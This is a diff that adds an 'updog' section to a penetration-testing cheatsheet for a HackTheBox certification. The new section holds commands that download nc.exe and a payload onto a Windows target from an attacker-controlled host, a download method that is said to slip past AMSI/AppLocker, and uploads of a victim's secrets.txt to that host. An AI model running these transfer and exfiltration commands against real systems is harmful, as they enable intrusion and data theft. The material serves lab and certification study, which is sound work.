@@ -114,6 +114,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [enum4linux](#enum4linux)
 - [Metasploit](#Metasploit)
 - [smbclient](#smbclient)
+- [updog](#updog)
 - [WebDAV](#WebDAV)
 - [Burp Suite](#Burp-Suite)
 - [whatweb](#whatweb)
@@ -3976,9 +3977,34 @@ prompt off
 recurse true
 mget *
 
+
+```
+## updog
+```
+# Command to start the server (allow upload + download)
+updog -d . -p 8080
+updog -d /path/to/my/tools -p 443 --ssl --password MySecretPass123! --hide-base-path
+
+# Download and save file 
+Invoke-WebRequest -Uri "http://10.10.14.5:8000/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"
+or
+iwr -Uri "http://10.10.14.5:8000/nc.exe" -OutFile "nc.exe"
+or
+curl -k -u :MySecretPass123! https://192.168.1.50/payload.exe -o C:\Windows\Temp\payload.exe
+
+# Use .NET WebClient (Sometimes passing AMSI/AppLocker is better than IWR in some cases)
+(New-Object Net.WebClient).DownloadFile('http://10.10.14.5:8000/nc.exe','C:\Windows\Temp\nc.exe')
+
+# Upload file 
+curl -F "file=@C:\Users\victim\Documents\secrets.txt" http://10.10.14.5:8000/upload
+or
+$uri = "http://10.10.14.5:8000/upload"
+$filePath = "C:\Users\victim\Documents\secrets.txt"
+Invoke-WebRequest -Uri $uri -Method Post -InFile $filePath -ContentType "multipart/form-data"
+
+
 ```
 ## WebDAV
-
 ```
 # Use Nmap to scan for WebDAV and enabled methods:
 nmap -p 80,443 --script http-webdav-scan --script-args http-webdav-scan.path=/ 192.168.109.122
